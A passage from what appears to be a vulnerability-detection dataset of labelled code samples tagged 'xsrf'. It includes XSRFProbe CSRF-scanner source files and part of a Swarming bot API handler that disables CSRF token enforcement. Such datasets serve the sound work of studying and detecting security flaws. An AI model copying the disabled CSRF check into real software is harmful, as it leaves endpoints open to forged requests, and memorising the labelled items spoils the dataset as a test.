xsrfprobe.py')\nparser._action_groups.pop()\n\n# A simple hack to have required argumentsa and optional arguments separately\nrequired = parser.add_argument_group('Required Arguments')\noptional = parser.add_argument_group('Optional Arguments')\n\n# Required Options\nrequired.add_argument('-u', '--url', help='Main URL to test', dest='url')\n\n# Optional Arguments (main stuff and necessary)\noptional.add_argument('-c', '--cookie', help='Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.', dest='cookie')\noptional.add_argument('-o', '--output', help='Output directory where files to be stored. Default is the`files` folder where all files generated will be stored.', dest='output')\noptional.add_argument('-d', '--delay', help='Time delay between requests in seconds. Default is zero.', dest='delay', type=float)\noptional.add_argument('-q', '--quiet', help='Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen. ', dest='quiet', action='store_true')\noptional.add_argument('-v', '--verbose', help='Increase the verbosity of the output (e.g., -vv is more than -v). ', dest='verbose', action='store_true')\n\n# Other Options\n# optional.add_argument('-h', '--help', help='Show this help message and exit', dest='disp', default=argparse.SUPPRESS, action='store_true')\noptional.add_argument('--user-agent', help='Custom user-agent to be used. Only one user-agent can be specified.', dest='user_agent', type=str)\noptional.add_argument('--headers', help='Comma separated list of custom headers you\\'d want to use. For example: ``--headers \"Accept=text/php, X-Requested-With=Dumb\"``.', dest='headers', type=str)\noptional.add_argument('--exclude', help='Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won\\'t be scanned. For example: `--exclude somepage/, sensitive-dir/, pleasedontscan/`', dest='exclude', type=str)\noptional.add_argument('--timeout', help='HTTP request timeout value in seconds. The entered value must be in floating point decimal. Example: ``--timeout 10.0``', dest='timeout', type=float)\noptional.add_argument('--max-chars', help='Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.', dest='maxchars', type=int)\noptional.add_argument('--crawl', help=\"Crawl the whole site and simultaneously test all discovered endpoints for CSRF.\", dest='crawl', action='store_true')\noptional.add_argument('--skip-analysis', help='Skip the Post-Scan Analysis of Tokens which were gathered during requests', dest='skipal', action='store_true')\noptional.add_argument('--skip-poc', help='Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.', dest='skippoc', action='store_true')\noptional.add_argument('--display', help='Print out response headers of requests while making requests.', dest='disphead', action='store_true')\noptional.add_argument('--update', help='Update XSRFProbe to latest version on GitHub via git.', dest='update', action='store_true')\noptional.add_argument('--random-agent', help='Use random user-agents for making requests.', dest='randagent', action='store_true')\noptional.add_argument('--version', help='Display the version of XSRFProbe and exit.', dest='version', action='store_true')\nargs = parser.parse_args()\n\nif not len(sys.argv) > 1:\n    print('''\n    \\033[1;91mXSRFProbe\\033[0m, \\033[1;97mA \\033[1;93mCross Site Request Forgery \\033[1;97mAudit Toolkit\\033[0m\n''')\n    parser.print_help()\n    quit('')\n\n# Update XSRFProbe to latest version\nif args.update:\n    updater()\n    quit('')\n\n# Print out XSRFProbe version\nif args.version:\n    print('\\n\\033[1;97m [+] \\033[1;91mXSRFProbe Version\\033[0m : \\033[1;97m'+open('files/VersionNum').read())\n    quit()\n\n# Now lets update some global config variables\nif args.maxchars:\n    config.TOKEN_GENERATION_LENGTH = args.maxchars\n\n# Setting custom user-agent\nif args.user_agent:\n    config.USER_AGENT = args.user_agent\n\n# Option to skip analysis\nif args.skipal:\n    config.SCAN_ANALYSIS = False\n\n# Option to skip poc generation\nif args.skippoc:\n    config.POC_GENERATION = False\n\n# Updating main root url\nif not args.version and not args.update:\n    if args.url: # and not args.help:\n        if 'http' in args.url:\n            config.SITE_URL = args.url\n        else:\n            config.SITE_URL = 'http://'+args.url\n    else:\n        print(R+'You must supply a url/endpoint.')\n\n# Crawl the site if --crawl supplied.\nif args.crawl:\n    config.CRAWL_SITE = True\n    # Turning off the display header feature due to too much log generation.\n    config.DISPLAY_HEADERS = False\n\nif args.cookie:\n    # Assigning Cookie\n    if ',' in args.cookie:\n        for cook in args.cookie.split(','):\n            config.COOKIE_VALUE.append(cook.strip())\n            # This is necessary when a cookie value is supplied\n            # Since if the user-agent used to make the request changes\n            # from time to time, the remote site might trigger up\n            # security mechanisms (or worse, perhaps block your ip?)\n            config.USER_AGENT_RANDOM = False\n\n# Set the headers displayer to 1 (actively display headers)\nif args.disphead:\n    config.DISPLAY_HEADERS = True\n\n# Timeout value\nif args.timeout:\n    config.TIMEOUT_VALUE = args.timeout\n\n# Custom header values if specified\nif args.headers:\n    # NOTE: As a default idea, when the user supplies custom headers, we\n    # simply add the custom headers to a list of existing headers in\n    # files/config.py.\n    # Uncomment the following lines to just reinitialise the headers everytime\n    # they make a request.\n    #\n    #config.HEADER_VALUES = {}\n    for m in args.headers.split(','):\n        config.HEADER_VALUES[m.split('=')[0]] = m.split('=')[1]  # nice hack ;)\n\nif args.exclude:\n    exc = args.exclude\n    #config.EXCLUDE_URLS = [s for s in exc.split(',').strip()]\n    m = exc.split(',').strip()\n    for s in m:\n        config.EXCLUDE_DIRS.append(urllib.parse.urljoin(config.SITE_URL, s))\n\nif args.randagent:\n    # If random-agent argument supplied...\n    config.USER_AGENT_RANDOM = True\n    # Turn off a single User-Agent mechanism...\n    config.USER_AGENT = ''\n\nif config.SITE_URL:\n    if args.output:\n        # If output directory is mentioned...\n        try:\n            if not os.path.exists(args.output+tld.get_fld(config.SITE_URL)):\n                os.makedirs(args.output+tld.get_fld(config.SITE_URL))\n        except FileExistsError:\n            pass\n        config.OUTPUT_DIR = args.output+tld.get_fld(config.SITE_URL) + '/'\n    else:\n        try:\n            os.makedirs(tld.get_fld(config.SITE_URL))\n        except FileExistsError:\n            pass\n        config.OUTPUT_DIR = tld.get_fld(config.SITE_URL) + '/'\n\nif args.quiet:\n    config.DEBUG = False\n/n/n/ncore/utils.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-:-:-:#\n#    XSRFProbe     #\n#-:-:-:-:-:-:-:-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\nfrom difflib import SequenceMatcher\n\ndef sameSequence(str1,str2):\n    '''\n    This function is intended to find same sequence\n                between str1 and str2.\n    '''\n    # Initialize SequenceMatcher object with\n    # Input string\n    seqMatch = SequenceMatcher(None, str1, str2)\n\n    # Find match of longest sub-string\n    # Output will be like Match(a=0, b=0, size=5)\n    match = seqMatch.find_longest_match(0, len(str1), 0, len(str2))\n\n    # Print longest substring\n    if (match.size!=0):\n        return (str1[match.a: match.a + match.size])\n    else:\n        return ''\n\ndef replaceStrIndex(text, index=0, replacement=''):\n    '''\n    This method returns a tampered string by\n                    replacement\n    '''\n    return '%s%s%s' % (text[:index], replacement, text[index+1:])\n\ndef checkDuplicates(iterable):\n    '''\n    This function works as a byte sequence checker for\n            tuples passed onto this function.\n    '''\n    seen = set()\n    for x in iterable:\n        if x in seen:\n            return True\n        seen.add(x)\n    return False\n\ndef byteString(s, encoding='utf8'):\n    \"\"\"\n    Return a byte-string version of 's',\n            Encoded as utf-8.\n    \"\"\"\n    try:\n        s = s.encode(encoding)\n    except (UnicodeEncodeError, UnicodeDecodeError):\n        s = str(s)\n    return s\n\ndef subSequence(str1,str2):\n    '''\n    Returns whether 'str1' and 'str2' are subsequence\n                    of one another.\n    '''\n    j = 0    # Index of str1\n    i = 0    # Index of str2\n\n    # Traverse both str1 and str2\n    # Compare current character of str2 with\n    # First unmatched character of str1\n    # If matched, then move ahead in str1\n    m = len(str1)\n    n = len(str2)\n    while j<m and i<n:\n        if str1[j] == str2[i]:\n            j = j+1\n        i = i + 1\n\n    # If all characters of str1 matched, then j is equal to m\n    return j==m\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "398ed11584313a371763240392c4dda1cf986deb", "code": "/core/logger.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-::-:-:#\n#    XSRF Probe     #\n#-:-:-:-:-:-:-::-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\nimport os\nfrom core.colors import *\nfrom files.config import *\nfrom core.verbout import verbout\nfrom files.discovered import INTERNAL_URLS, FILES_EXEC, SCAN_ERRORS\nfrom files.discovered import VULN_LIST, FORMS_TESTED, REQUEST_TOKENS\n\ndef logger(filename, content):\n    '''\n    This module is for logging all the stuff we found\n            while crawling and scanning.\n    '''\n    output_file = OUTPUT_DIR + filename + '.log'\n    with open(output_file, 'w+', encoding='utf8') as f:\n        if type(content) is tuple or type(content) is list:\n            for m in content:  # if it is list or tuple, it is iterable\n                f.write(m+'\\n')\n        else:\n            f.write(content)  # else we write out as it is... ;)\n        f.write('\\n')\n\ndef pheaders(tup):\n    '''\n    This module prints out the headers as received in the\n                    requests normally.\n    '''\n    verbout(GR, 'Receiving headers...\\n')\n    verbout(color.GREY,'  '+color.UNDERLINE+'HEADERS'+color.END+color.GREY+':'+'\\n')\n    for key, val in tup.items():\n        verbout('  ',color.CYAN+key+': '+color.ORANGE+val)\n    verbout('','')\n\ndef GetLogger():\n    if INTERNAL_URLS:\n        logger('internal-links', INTERNAL_URLS)\n    if SCAN_ERRORS:\n        logger('errored', SCAN_ERRORS)\n    if FILES_EXEC:\n        logger('files-found', FILES_EXEC)\n    if REQUEST_TOKENS:\n        logger('anti-csrf-tokens', REQUEST_TOKENS)\n    if FORMS_TESTED:\n        logger('forms-tested', FORMS_TESTED)\n    if VULN_LIST:\n        logger('vulnerabilities', VULN_LIST)\n\ndef ErrorLogger(url, error):\n    con = '(i) '+url+' -> '+error.__str__()\n    SCAN_ERRORS.append(con)\n\ndef VulnLogger(url, vuln):\n    tent = '[!] '+url+' -> '+vuln\n    VULN_LIST.append(tent)\n/n/n/n/core/options.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-::-:-:#\n#    XSRF Probe     #\n#-:-:-:-:-:-:-::-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\n# Importing stuff\nimport argparse, sys, tld\nimport urllib.parse, os\nfrom files import config\nfrom core.colors import R, G\nfrom core.updater import updater\n\n# Processing command line arguments\nparser = argparse.ArgumentParser('python3 xsrfprobe.py')\nparser._action_groups.pop()\n\n# A simple hack to have required argumentsa and optional arguments separately\nrequired = parser.add_argument_group('Required Arguments')\noptional = parser.add_argument_group('Optional Arguments')\n\n# Required Options\nrequired.add_argument('-u', '--url', help='Main URL to test', dest='url')\n\n# Optional Arguments (main stuff and necessary)\noptional.add_argument('-c', '--cookie', help='Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.', dest='cookie')\noptional.add_argument('-o', '--output', help='Output directory where files to be stored. Default is the`files` folder where all files generated will be stored.', dest='output')\noptional.add_argument('-d', '--delay', help='Time delay between requests in seconds. Default is zero.', dest='delay', type=float)\noptional.add_argument('-q', '--quiet', help='Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen. ', dest='quiet', action='store_true')\noptional.add_argument('-v', '--verbose', help='Increase the verbosity of the output (e.g., -vv is more than -v). ', dest='verbose', action='store_true')\n\n# Other Options\n# optional.add_argument('-h', '--help', help='Show this help message and exit', dest='disp', default=argparse.SUPPRESS, action='store_true')\noptional.add_argument('--user-agent', help='Custom user-agent to be used. Only one user-agent can be specified.', dest='user_agent', type=str)\noptional.add_argument('--headers', help='Comma separated list of custom headers you\\'d want to use. For example: ``--headers \"Accept=text/php, X-Requested-With=Dumb\"``.', dest='headers', type=str)\noptional.add_argument('--exclude', help='Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won\\'t be scanned. For example: `--exclude somepage/, sensitive-dir/, pleasedontscan/`', dest='exclude', type=str)\noptional.add_argument('--timeout', help='HTTP request timeout value in seconds. The entered value must be in floating point decimal. Example: ``--timeout 10.0``', dest='timeout', type=float)\noptional.add_argument('--max-chars', help='Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.', dest='maxchars', type=int)\noptional.add_argument('--crawl', help=\"Crawl the whole site and simultaneously test all discovered endpoints for CSRF.\", dest='crawl', action='store_true')\noptional.add_argument('--skip-analysis', help='Skip the Post-Scan Analysis of Tokens which were gathered during requests', dest='skipal', action='store_true')\noptional.add_argument('--skip-poc', help='Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.', dest='skippoc', action='store_true')\noptional.add_argument('--update', help='Update XSRFProbe to latest version on GitHub via git.', dest='update', action='store_true')\noptional.add_argument('--random-agent', help='Use random user-agents for making requests.', dest='randagent', action='store_true')\noptional.add_argument('--version', help='Display the version of XSRFProbe and exit.', dest='version', action='store_true')\nargs = parser.parse_args()\n\nif not len(sys.argv) > 1:\n    print('''\n    \\033[1;91mXSRFProbe\\033[0m, \\033[1;97mA \\033[1;93mCross Site Request Forgery \\033[1;97mAudit Toolkit\\033[0m\n''')\n    parser.print_help()\n    quit('')\n\n# Update XSRFProbe to latest version\nif args.update:\n    updater()\n    quit('')\n\n# Print out XSRFProbe version\nif args.version:\n    print('\\n\\033[1;97m [+] \\033[1;91mXSRFProbe Version\\033[0m : \\033[1;97m'+open('files/VersionNum').read())\n    quit()\n\n# Now lets update some global config variables\nif args.maxchars:\n    config.TOKEN_GENERATION_LENGTH = args.maxchars\n\n# Setting custom user-agent\nif args.user_agent:\n    config.USER_AGENT = args.user_agent\n\n# Option to skip analysis\nif args.skipal:\n    config.SCAN_ANALYSIS = False\n\n# Option to skip poc generation\nif args.skippoc:\n    config.POC_GENERATION = False\n\n# Updating main root url\nif not args.version and not args.update:\n    if args.url: # and not args.help:\n        if 'http' in args.url:\n            config.SITE_URL = args.url\n        else:\n            config.SITE_URL = 'http://'+args.url\n    else:\n        print(R+'You must supply a url/endpoint.')\n\n# Crawl the site if --crawl supplied.\nif args.crawl:\n    config.CRAWL_SITE = True\n\nif args.cookie:\n    # Assigning Cookie\n    if ',' in args.cookie:\n        for cook in args.cookie.split(','):\n            config.COOKIE_VALUE.append(cook.strip())\n            # This is necessary when a cookie value is supplied\n            # Since if the user-agent used to make the request changes\n            # from time to time, the remote site might trigger up\n            # security mechanisms (or worse, perhaps block your ip?)\n            config.USER_AGENT_RANDOM = False\n\n# Timeout value\nif args.timeout:\n    config.TIMEOUT_VALUE = args.timeout\n\n# Custom header values if specified\nif args.headers:\n    # NOTE: As a default idea, when the user supplies custom headers, we\n    # simply add the custom headers to a list of existing headers in\n    # files/config.py.\n    # Uncomment the following lines to just reinitialise the headers everytime\n    # they make a request.\n    #\n    #config.HEADER_VALUES = {}\n    for m in args.headers.split(','):\n        config.HEADER_VALUES[m.split('=')[0]] = m.split('=')[1]\n\nif args.exclude:\n    exc = args.exclude\n    #config.EXCLUDE_URLS = [s for s in exc.split(',').strip()]\n    m = exc.split(',').strip()\n    for s in m:\n        config.EXCLUDE_DIRS.append(urllib.parse.urljoin(config.SITE_URL, s))\n\nif args.randagent:\n    # If random-agent argument supplied...\n    config.USER_AGENT_RANDOM = True\n    # Turn off a single User-Agent mechanism...\n    config.USER_AGENT = ''\n\nif config.SITE_URL:\n    if args.output:\n        # If output directory is mentioned...\n        try:\n            if not os.path.exists(args.output+tld.get_fld(config.SITE_URL)):\n                os.makedirs(args.output+tld.get_fld(config.SITE_URL))\n        except FileExistsError:\n            pass\n        config.OUTPUT_DIR = args.output+tld.get_fld(config.SITE_URL) + '/'\n    else:\n        try:\n            os.makedirs(tld.get_fld(config.SITE_URL))\n        except FileExistsError:\n            pass\n        config.OUTPUT_DIR = tld.get_fld(config.SITE_URL) + '/'\n\nif args.quiet:\n    config.DEBUG = False\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "c23a5bf6278f55b3f8135e0edab9927599a09236", "code": "appengine/swarming/handlers_bot.py/n/n# Copyright 2015 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Internal bot API handlers.\"\"\"\n\nimport base64\nimport json\nimport logging\nimport textwrap\n\nimport webob\nimport webapp2\n\nfrom google.appengine.api import app_identity\nfrom google.appengine.api import datastore_errors\nfrom google.appengine.datastore import datastore_query\nfrom google.appengine import runtime\nfrom google.appengine.ext import ndb\n\nfrom components import auth\nfrom components import ereporter2\nfrom components import utils\nfrom server import acl\nfrom server import bot_code\nfrom server import bot_management\nfrom server import stats\nfrom server import task_pack\nfrom server import task_request\nfrom server import task_result\nfrom server import task_scheduler\nfrom server import task_to_run\n\n\ndef has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if unexpected keys are present or expected keys are\n  missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  superfluous = actual_keys - expected_keys\n  missing = minimum_keys - actual_keys\n  if superfluous or missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    msg_superfluous = (\n        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')\n    return 'Unexpected %s%s%s; did you make a typo?' % (\n        name, msg_missing, msg_superfluous)\n\n\ndef has_unexpected_keys(expected_keys, actual_keys, name):\n  \"\"\"Return an error if unexpected keys are present or expected keys are\n  missing.\n  \"\"\"\n  return has_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, name)\n\n\ndef log_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  message = has_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, name)\n  if message:\n    ereporter2.log_request(request, source=source, message=message)\n  return message\n\n\ndef log_unexpected_keys(expected_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n  \"\"\"\n  return log_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, request, source, name)\n\n\ndef has_missing_keys(minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if expected keys are not present.\n\n  Do not warn about unexpected keys.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  missing = minimum_keys - actual_keys\n  if missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)\n\n\nclass BootstrapHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns python code to run to bootstrap a swarming bot.\"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/x-python'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot_bootstrap.py\"')\n    self.response.out.write(\n        bot_code.get_bootstrap(self.request.host_url).content)\n\n\nclass BotCodeHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns a zip file with all the files required by a bot.\n\n  Optionally specify the hash version to download. If so, the returned data is\n  cacheable.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self, version=None):\n    if version:\n      expected = bot_code.get_bot_version(self.request.host_url)\n      if version != expected:\n        # This can happen when the server is rapidly updated.\n        logging.error('Requested Swarming bot %s, have %s', version, expected)\n        self.abort(404)\n      self.response.headers['Cache-Control'] = 'public, max-age=3600'\n    else:\n      self.response.headers['Cache-Control'] = 'no-cache, no-store'\n    self.response.headers['Content-Type'] = 'application/octet-stream'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot.zip\"')\n    self.response.out.write(\n        bot_code.get_swarming_bot_zip(self.request.host_url))\n\n\nclass _BotBaseHandler(auth.ApiHandler):\n  \"\"\"\n  Request body is a JSON dict:\n    {\n      \"dimensions\": <dict of properties>,\n      \"state\": <dict of properties>,\n      \"version\": <sha-1 of swarming_bot.zip uncompressed content>,\n    }\n  \"\"\"\n\n  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}\n  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  def _process(self):\n    \"\"\"Returns True if the bot has invalid parameter and should be automatically\n    quarantined.\n\n    Does one DB synchronous GET.\n\n    Returns:\n      tuple(request, bot_id, version, state, dimensions, quarantined_msg)\n    \"\"\"\n    request = self.parse_body()\n    version = request.get('version', None)\n\n    dimensions = request.get('dimensions', {})\n    state = request.get('state', {})\n    bot_id = None\n    if dimensions.get('id'):\n      dimension_id = dimensions['id']\n      if (isinstance(dimension_id, list) and len(dimension_id) == 1\n          and isinstance(dimension_id[0], unicode)):\n        bot_id = dimensions['id'][0]\n\n    # The bot may decide to \"self-quarantine\" itself. Accept both via\n    # dimensions or via state. See bot_management._BotCommon.quarantined for\n    # more details.\n    if (bool(dimensions.get('quarantined')) or\n        bool(state.get('quarantined'))):\n      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'\n\n    quarantined_msg = None\n    # Use a dummy 'for' to be able to break early from the block.\n    for _ in [0]:\n\n      quarantined_msg = has_unexpected_keys(\n          self.EXPECTED_KEYS, request, 'keys')\n      if quarantined_msg:\n        break\n\n      quarantined_msg = has_missing_keys(\n          self.REQUIRED_STATE_KEYS, state, 'state')\n      if quarantined_msg:\n        break\n\n      if not bot_id:\n        quarantined_msg = 'Missing bot id'\n        break\n\n      if not all(\n          isinstance(key, unicode) and\n          isinstance(values, list) and\n          all(isinstance(value, unicode) for value in values)\n          for key, values in dimensions.iteritems()):\n        quarantined_msg = (\n            'Invalid dimensions type:\\n%s' % json.dumps(dimensions,\n              sort_keys=True, indent=2, separators=(',', ': ')))\n        break\n\n      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)\n      if dimensions_count > task_to_run.MAX_DIMENSIONS:\n        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count\n        break\n\n      if not isinstance(\n          state.get('lease_expiration_ts'), (None.__class__, int)):\n        quarantined_msg = (\n            'lease_expiration_ts (%r) must be int or None' % (\n                state['lease_expiration_ts']))\n        break\n\n    if quarantined_msg:\n      line = 'Quarantined Bot\\nhttps://%s/restricted/bot/%s\\n%s' % (\n          app_identity.get_default_version_hostname(), bot_id,\n          quarantined_msg)\n      ereporter2.log_request(self.request, source='bot', message=line)\n      return request, bot_id, version, state, dimensions, quarantined_msg\n\n    # Look for admin enforced quarantine.\n    bot_settings = bot_management.get_settings_key(bot_id).get()\n    if bool(bot_settings and bot_settings.quarantined):\n      return request, bot_id, version, state, dimensions, 'Quarantined by admin'\n\n    return request, bot_id, version, state, dimensions, None\n\n\nclass BotHandshakeHandler(_BotBaseHandler):\n  \"\"\"First request to be called to get initial data like XSRF token.\n\n  The bot is server-controled so the server doesn't have to support multiple API\n  version. When running a task, the bot sync the the version specific URL. Once\n  abot finished its currently running task, it'll be immediately be upgraded\n  after on its next poll.\n\n  This endpoint does not return commands to the bot, for example to upgrade\n  itself. It'll be told so when it does its first poll.\n\n  Response body is a JSON dict:\n    {\n      \"bot_version\": <sha-1 of swarming_bot.zip uncompressed content>,\n      \"server_version\": \"138-193f1f3\",\n    }\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    bot_management.bot_event(\n        event_type='bot_connected', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=dimensions,\n        state=state, version=version, quarantined=bool(quarantined_msg),\n        task_id='', task_name=None, message=quarantined_msg)\n\n    data = {\n      # This access token will be used to validate each subsequent request.\n      'bot_version': bot_code.get_bot_version(self.request.host_url),\n      # TODO(maruel): Remove this once all the bots have been updated.\n      'expiration_sec': auth.handler.XSRFToken.expiration_sec,\n      'server_version': utils.get_app_version(),\n      # TODO(maruel): Remove this once all the bots have been updated.\n      'xsrf_token': self.generate_xsrf_token(),\n    }\n    self.send_response(data)\n\n\nclass BotPollHandler(_BotBaseHandler):\n  \"\"\"The bot polls for a task; returns either a task, update command or sleep.\n\n  In case of exception on the bot, this is enough to get it just far enough to\n  eventually self-update to a working version. This is to ensure that coding\n  errors in bot code doesn't kill all the fleet at once, they should still be up\n  just enough to be able to self-update again even if they don't get task\n  assigned anymore.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    \"\"\"Handles a polling request.\n\n    Be very permissive on missing values. This can happen because of errors\n    on the bot, *we don't want to deny them the capacity to update*, so that the\n    bot code is eventually fixed and the bot self-update to this working code.\n\n    It makes recovery of the fleet in case of catastrophic failure much easier.\n    \"\"\"\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    sleep_streak = state.get('sleep_streak', 0)\n    quarantined = bool(quarantined_msg)\n\n    # Note bot existence at two places, one for stats at 1 minute resolution,\n    # the other for the list of known bots.\n    action = 'bot_inactive' if quarantined else 'bot_active'\n    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)\n\n    def bot_event(event_type, task_id=None, task_name=None):\n      bot_management.bot_event(\n          event_type=event_type, bot_id=bot_id,\n          external_ip=self.request.remote_addr, dimensions=dimensions,\n          state=state, version=version, quarantined=quarantined,\n          task_id=task_id, task_name=task_name, message=quarantined_msg)\n\n    # Bot version is host-specific because the host URL is embedded in\n    # swarming_bot.zip\n    expected_version = bot_code.get_bot_version(self.request.host_url)\n    if version != expected_version:\n      bot_event('request_update')\n      self._cmd_update(expected_version)\n      return\n    if quarantined:\n      bot_event('request_sleep')\n      self._cmd_sleep(sleep_streak, quarantined)\n      return\n\n    #\n    # At that point, the bot should be in relatively good shape since it's\n    # running the right version. It is still possible that invalid code was\n    # pushed to the server, so be diligent about it.\n    #\n\n    # Bot may need a reboot if it is running for too long. We do not reboot\n    # quarantined bots.\n    needs_restart, restart_message = bot_management.should_restart_bot(\n        bot_id, state)\n    if needs_restart:\n      bot_event('request_restart')\n      self._cmd_restart(restart_message)\n      return\n\n    # The bot is in good shape. Try to grab a task.\n    try:\n      # This is a fairly complex function call, exceptions are expected.\n      request, run_result = task_scheduler.bot_reap_task(\n          dimensions, bot_id, version, state.get('lease_expiration_ts'))\n      if not request:\n        # No task found, tell it to sleep a bit.\n        bot_event('request_sleep')\n        self._cmd_sleep(sleep_streak, quarantined)\n        return\n\n      try:\n        # This part is tricky since it intentionally runs a transaction after\n        # another one.\n        if request.properties.is_terminate:\n          bot_event('bot_terminate', task_id=run_result.task_id)\n          self._cmd_terminate(run_result.task_id)\n        else:\n          bot_event(\n              'request_task', task_id=run_result.task_id,\n              task_name=request.name)\n          self._cmd_run(request, run_result.key, bot_id)\n      except:\n        logging.exception('Dang, exception after reaping')\n        raise\n    except runtime.DeadlineExceededError:\n      # If the timeout happened before a task was assigned there is no problems.\n      # If the timeout occurred after a task was assigned, that task will\n      # timeout (BOT_DIED) since the bot didn't get the details required to\n      # run it) and it will automatically get retried (TODO) when the task times\n      # out.\n      # TODO(maruel): Note the task if possible and hand it out on next poll.\n      # https://code.google.com/p/swarming/issues/detail?id=130\n      self.abort(500, 'Deadline')\n\n  def _cmd_run(self, request, run_result_key, bot_id):\n    cmd = None\n    if request.properties.commands:\n      cmd = request.properties.commands[0]\n    elif request.properties.command:\n      cmd = request.properties.command\n    out = {\n      'cmd': 'run',\n      'manifest': {\n        'bot_id': bot_id,\n        'command': cmd,\n        'dimensions': request.properties.dimensions,\n        'env': request.properties.env,\n        'extra_args': request.properties.extra_args,\n        'grace_period': request.properties.grace_period_secs,\n        'hard_timeout': request.properties.execution_timeout_secs,\n        'host': utils.get_versioned_hosturl(),\n        'io_timeout': request.properties.io_timeout_secs,\n        'inputs_ref': request.properties.inputs_ref,\n        'task_id': task_pack.pack_run_result_key(run_result_key),\n      },\n    }\n    self.send_response(utils.to_json_encodable(out))\n\n  def _cmd_sleep(self, sleep_streak, quarantined):\n    out = {\n      'cmd': 'sleep',\n      'duration': task_scheduler.exponential_backoff(sleep_streak),\n      'quarantined': quarantined,\n    }\n    self.send_response(out)\n\n  def _cmd_terminate(self, task_id):\n    out = {\n      'cmd': 'terminate',\n      'task_id': task_id,\n    }\n    self.send_response(out)\n\n  def _cmd_update(self, expected_version):\n    out = {\n      'cmd': 'update',\n      'version': expected_version,\n    }\n    self.send_response(out)\n\n  def _cmd_restart(self, message):\n    logging.info('Rebooting bot: %s', message)\n    out = {\n      'cmd': 'restart',\n      'message': message,\n    }\n    self.send_response(out)\n\n\nclass BotEventHandler(_BotBaseHandler):\n  \"\"\"On signal that a bot had an event worth logging.\"\"\"\n\n  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    (request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    event = request.get('event')\n    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):\n      self.abort_with_error(400, error='Unsupported event type')\n    message = request.get('message')\n    bot_management.bot_event(\n        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,\n        dimensions=dimensions, state=state, version=version,\n        quarantined=bool(quarantined_msg), task_id=None, task_name=None,\n        message=message)\n\n    if event == 'bot_error':\n      line = (\n          'Bot: https://%s/restricted/bot/%s\\n'\n          'Bot error:\\n'\n          '%s') % (\n          app_identity.get_default_version_hostname(), bot_id, message)\n      ereporter2.log_request(self.request, source='bot', message=line)\n    self.send_response({})\n\n\nclass BotTaskUpdateHandler(auth.ApiHandler):\n  \"\"\"Receives updates from a Bot for a task.\n\n  The handler verifies packets are processed in order and will refuse\n  out-of-order packets.\n  \"\"\"\n  ACCEPTED_KEYS = {\n    u'bot_overhead', u'cost_usd', u'duration', u'exit_code',\n    